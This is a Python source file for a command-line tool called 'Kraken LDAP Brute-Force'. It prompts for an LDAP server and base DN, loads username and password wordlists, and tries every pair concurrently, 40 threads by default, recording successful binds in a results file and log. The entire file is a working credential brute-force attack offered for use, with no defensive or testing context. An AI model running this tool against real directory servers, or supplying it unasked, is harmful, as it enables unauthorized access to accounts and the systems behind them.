import os
import sys
import time
import logging
from ldap3 import Server, Connection, ALL
from random import choice
import gevent
from gevent import monkey
from gevent.pool import Pool
from colorama import Fore, Style, init
import pyfiglet


monkey.patch_all()


init(autoreset=True)


script_dir = os.path.dirname(os.path.abspath(__file__))
results_dir = os.path.join(script_dir, '..', 'Results')
logs_dir = os.path.join(script_dir, '..', 'Logs')


os.makedirs(results_dir, exist_ok=True)
os.makedirs(logs_dir, exist_ok=True)


logging.basicConfig(filename=os.path.join(logs_dir, 'ldap_brute_force.log'), level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def clear_console():
    """Clears the console window."""
    os.system('cls' if os.name == 'nt' else 'clear')

def display_banner():
    """Displays the banner for the script."""
    colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN]
    banner_color = choice(colors)
    banner = pyfiglet.figlet_format("Kraken LDAP Brute-Force", font="slant")
    print(Style.BRIGHT + banner_color + banner)
    print(Style.RESET_ALL + Fore.WHITE + "="*80 + "\n")

def load_file(filepath):
    """Loads usernames or passwords from a specified file."""
    if os.path.isfile(filepath):
        with open(filepath, "r") as file:
            lines = [line.strip() for line in file if line.strip()]
        logging.info(f"Loaded {len(lines)} entries from {filepath}.")
        return lines
    logging.error(f"File not found: {filepath}")
    sys.exit(1)

def setup_ldap():
    """Prompts for LDAP configuration."""
    ldap_host = input(Fore.WHITE + "Enter the LDAP server address: ").strip()
    ldap_port = int(input(Fore.WHITE + "Enter the LDAP server port (default is 389, press Enter for default): ") or 389)
    base_dn = input(Fore.WHITE + "Enter the base DN (e.g., dc=example,dc=com): ").strip()
    logging.info(f"LDAP configuration: Host={ldap_host}, Port={ldap_port}, Base DN={base_dn}")
    return ldap_host, ldap_port, base_dn

def attempt_login(username, password, ldap_host, ldap_port, base_dn, attempt_number, total_attempts, start_time, result_file):
    """Attempts to log in to the LDAP server using provided credentials."""
    def format_output(success):
        elapsed_time = time.time() - start_time
        percentage = (attempt_number / total_attempts) * 100
        estimated_total_time = elapsed_time / (attempt_number / total_attempts)
        remaining_time = estimated_total_time - elapsed_time
        time_remaining_str = time.strftime('%H:%M:%S', time.gmtime(remaining_time))
        status = "Success" if success else ""
        return f"\r[{attempt_number}/{total_attempts}] Tested - {percentage:.2f}% | Estimated Remaining Time: {time_remaining_str} | Current: {username}:{password} {status}"

    try:
        server = Server(ldap_host, port=ldap_port, get_info=ALL)
        dn = f"{username},{base_dn}"
        conn = Connection(server, user=dn, password=password, auto_bind=True)

        sys.stdout.write('\033[K')  
        success_msg = format_output(True)
        print(Style.BRIGHT + Fore.GREEN + success_msg + Style.RESET_ALL)
        logging.info(success_msg.strip())
        result_file.write(success_msg.strip() + "\n")
        result_file.flush()  
        return success_msg
    except Exception as e:
        sys.stdout.write('\033[K')  
        fail_msg = format_output(False)
        print(Fore.WHITE + fail_msg, end='', flush=True)
        logging.info(f"Failed: {username}:{password} - {str(e)}")
        return None

def run_brute_force(ldap_host, ldap_port, base_dn, users, passwords, threads):
    """Executes brute force login attempts using gevent pool."""
    total_attempts = len(users) * len(passwords)
    start_time = time.time()
    attempt_number = 0
    results = []
    pool = Pool(threads)

    result_file_path = os.path.join(results_dir, "ldap_results.txt")
    with open(result_file_path, "a") as result_file:  

        def handle_result(username, password):
            nonlocal attempt_number
            attempt_number += 1
            result = attempt_login(username, password, ldap_host, ldap_port, base_dn, attempt_number, total_attempts, start_time, result_file)
            if result:
                results.append(result)

        for username in users:
            for password in passwords:
                pool.spawn(handle_result, username, password)

        pool.join()

    logging.info("Brute force process completed.")

def main():
    clear_console()
    display_banner()

    ldap_host, ldap_port, base_dn = setup_ldap()

    u_file = input(Fore.WHITE + "Enter the user file name or press Enter to use default ('users.txt'): ").strip() or os.path.join(script_dir, "..", "wordlists", "users.txt")
    p_file = input(Fore.WHITE + "Enter the password file name or press Enter to use default ('passwords.txt'): ").strip() or os.path.join(script_dir, "..", "wordlists", "passwords.txt")
    
    users = load_file(u_file)
    passwords = load_file(p_file)

    threads = int(input(Fore.WHITE + "Enter number of threads to use (default: 40, press Enter for default): ") or 40)

    print(Style.RESET_ALL + Fore.WHITE + "\n" + "="*80 + "\n")
    run_brute_force(ldap_host, ldap_port, base_dn, users, passwords, threads)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        logging.info(Fore.YELLOW + "\nScript interrupted by user.")
        print(Fore.YELLOW + "\nScript interrupted by user.")
